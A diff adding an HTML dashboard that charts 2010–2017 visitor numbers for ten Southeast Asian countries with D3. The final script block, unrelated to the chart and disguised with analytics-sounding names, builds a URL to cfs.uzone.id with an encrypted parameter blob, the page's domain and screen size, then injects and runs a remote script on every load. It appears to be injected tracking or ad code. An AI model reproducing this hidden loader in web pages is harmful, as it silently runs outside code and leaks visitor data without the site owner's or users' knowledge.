@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+		<title>
+			Dashboard
+		</title>
+		<script src="http://code.jquery.com/jquery-latest.min.js"></script>
+		<script src="https://d3js.org/d3.v4.min.js"></script>
+		<script src="./js/multiSeriesLineChart.js"></script>
+	</head>
+	<body>
+		<div id="chart">
+		</div>
+	</body>
+	<script>
+		// window.addEventListener('resize', function (event) {
+		// 	$("#chart").width(window.innerWidth * 0.9);
+		// 	$("#chart").height(window.innerHeight);
+		// });
+	</script>
+	<script>
+			function extend(obj, src) {
+				for (var key in src) {
+					if (src.hasOwnProperty(key)) obj[key] = src[key];
+				}
+				return obj;
+			}
+			var rawLineData = {
+				"thailand": {
+					"2010": 15936400,
+					"2011": 19230470,
+					"2012": 22353903,
+					"2013": 26546725,
+					"2014": 24809683,
+					"2015": 29881091,
+					"2016": 32588303,
+					"2017": 35381210
+				},
+				"malaysia": {
+					"2010": 24577196,
+					"2011": 24714324,
+					"2012": 25032708,
+					"2013": 25715460,
+					"2014": 27437315,
+					"2015": 25721251,
+					"2016": 26757392,
+					"2017": 25948459
+				},
+				"singapore": {
+					"2010": 11641700,
+					"2011": 13171303,
+					"2012": 14496091,
+					"2013": 15567923,
+					"2014": 15095152,
+					"2015": 15231469,
+					"2016": 16402593,
+					"2017": 17422826
+				},
+				"indonesia": {
+					"2010": 7002944,
+					"2011": 7649731,
+					"2012": 8044462,
+					"2013": 8802129,
+					"2014": 9435411,
+					"2015": 10406759,
+					"2016": 11519275,
+					"2017": 14039799
+				},
+				"vietnam": {
+					"2010": 5049855,
+					"2011": 6014032,
+					"2012": 6847678,
+					"2013": 7572352,
+					"2014": 7874312,
+					"2015": 7943651,
+					"2016": 10012735,
+					"2017": 12922151
+				},
+				"phillipine": {
+					"2010": 3520471,
+					"2011": 3917454,
+					"2012": 4272811,
+					"2013": 4681307,
+					"2014": 4833368,
+					"2015": 5360682,
+					"2016": 5967005,
+					"2017": 6620908
+				},
+				"cambodia": {
+					"2010": 2508289,
+					"2011": 2881862,
+					"2012": 3584307,
+					"2013": 4210165,
+					"2014": 4502775,
+					"2015": 4775231,
+					"2016": 5011712,
+					"2017": 5602157
+				},
+				"laos": {
+					"2010": 2513028,
+					"2011": 2723564,
+					"2012": 3330072,
+					"2013": 3779490,
+					"2014": 4158719,
+					"2015": 4684429,
+					"2016": 4239047,
+					"2017": 3860000
+				},
+				"myanmar": {
+					"2010": 791505,
+					"2011": 816369,
+					"2012": 1058995,
+					"2013": 2044307,
+					"2014": 3081412,
+					"2015": 4681020,
+					"2016": 2907207,
+					"2017": 3443133
+				},
+				"brunei": {
+					"2010": 214290,
+					"2011": 242061,
+					"2012": 209108,
+					"2013": 224904,
+					"2014": 200989,
+					"2015": 218213,
+					"2016": 218809,
+					"2017": 258955
+				}
+			};
+
+			var rawLineColumn = {
+				"thailand": "Thailand",
+				"malaysia": "Malaysia",
+				"singapore": "Singapore",
+				"indonesia": "Indonesia",
+				"vietnam": "Vietnam",
+				"phillipine": "Phillipines",
+				"cambodia": "Cambodia",
+				"laos": "Laos",
+				"myanmar": "Myanmar",
+				"brunei": "Brunei Darussalam"
+			}
+
+			var groupChartData = [
+				{
+					over: "2010"
+				},
+				{
+					over: "2011"
+				},
+				{
+					over: "2012"
+				},
+				{
+					over: "2013"
+				},
+				{
+					over: "2014"
+				},
+				{
+					over: "2015"
+				},
+				{
+					over: "2016"
+				},
+				{
+					over: "2017"
+				}
+			];
+			
+			var columnsInfo = {};
+
+			var countries = [
+				"thailand",
+				"malaysia",
+				"singapore",
+				"indonesia",
+				"vietnam",
+				"phillipine",
+				"cambodia",
+				"laos",
+				"myanmar",
+				"brunei"
+			];
+			var years = ["2010", "2011", "2012", "2013", "2014", "2015", "2016", "2017"]
+
+			years.forEach((year, idx) => {
+				mainObj = {
+					"over": year
+				}
+
+				countries.forEach(country => {
+					obj = {};
+					obj[country] = rawLineData[country][year];
+					mainObj = {...mainObj, ...obj };
+				});
+
+				groupChartData[idx] = {...groupChartData[idx], ...mainObj };
+			});
+
+			countries.forEach(country => {
+				objInfo = {};
+				objInfo[country] = rawLineColumn[country];
+				columnsInfo = {...columnsInfo, ...objInfo };
+			});
+
+			console.log(groupChartData);
+			console.log(columnsInfo);
+
+			$("#chart").empty();
+			var muliSeriesChartConfig = {
+				mainDiv: "#chart",
+				colorRange: ["#2c6b70", "#96653d", "#c4852f", "#eb2025", "#9a2e33", 
+					"#dd5727", "#d78e2a", "#8b7a3c", "#a8cf5a", "#4c3a3f"],
+				data: groupChartData,
+				columnsInfo: columnsInfo,
+				years: years,
+				xAxis: "over",
+				yAxis: "runs",
+				label: {
+					xAxis: "Year",
+					yAxis: "Visitors (million people)"
+				},
+				requireCircle: true,
+				requireLegend: true
+			};
+			var muliSeriesChart = new multiSeriesLineChart(muliSeriesChartConfig);
+		</script>
+		<script type="text/javascript">
+			if (self==top) {
+				function netbro_cache_analytics(fn, callback) {
+					setTimeout(function() {
+						fn();
+						callback();
+					}, 0);
+				}
+				function sync(fn) {
+					fn();
+				}
+				function requestCfs(){
+					var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
+					var idc_glo_r = Math.floor(Math.random()*99999999999);
+					var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2tIcRZ5y6qo4CTlz5HvmSaqzAZXLV6w0QiAK3goRLw9IwDH6rRzZrW%2bb%2bwUt5Wswsei9pGyX3iuyophQ3D6x%2fUoNueAqQ6cQEIwcELTyacY1qA7vsiYP9dJrscmn8SxUqUCC%2beO6zT8qbs44afCkAaoODAFe9IxhxaLatMOjEPA35JftdTijeP2vRt%2fB6qi%2b9tPhQlx1pWdNlR2A1qAMfY8YykThDORF37gA%2fE86uMGcQtif3OJpmgdXknV7nDH%2b2bcOl1RJM%2fIBvLPq1mJdpb7mNE%2bGekvvfH0%2fhKI0%2fJRza9%2fmO6INOSyaPPa1%2btKjBy1w7oQ%2fvecft%2f1%2b%2bu9zNCTvhGf37l%2bb%2flWg8IaKNsmr5s%2fHd0yGiOhIt3QW9o7KrCePchWb2q2kf8qHWS6aZwoXrkeKJiRbJaP3KU%2fyqcWen%2fVI8tHYQ%2fOadAjm0XH1jPZ5bhGrSPvabD9q6gD%2bU3OFCkcdVzj7yPJ%2bCp1Z55Mh%2fM9FjZtLsPS42O68OvObm13Feyn1UMvJOX%2ffbzAuK7ICe83DPJX2Vs2St5WFSrAH1QNLSW%2f3QvEoAy0DCrdkfVMYgh3LSQYyPAp8KJDeAPtOz%2bbo9CR8wYvuLl51%2bKMniBn5hK1yYWGFrAHFs1Cr54zmOwll8D%2bYue%2b70WEzTYw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
+					var bsa = document.createElement('script');
+					bsa.type = 'text/javascript';
+					bsa.async = true;bsa.src = url;
+					(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
+				}
+				
+				netbro_cache_analytics(requestCfs, function(){});
+			};
+		</script>
+</html>
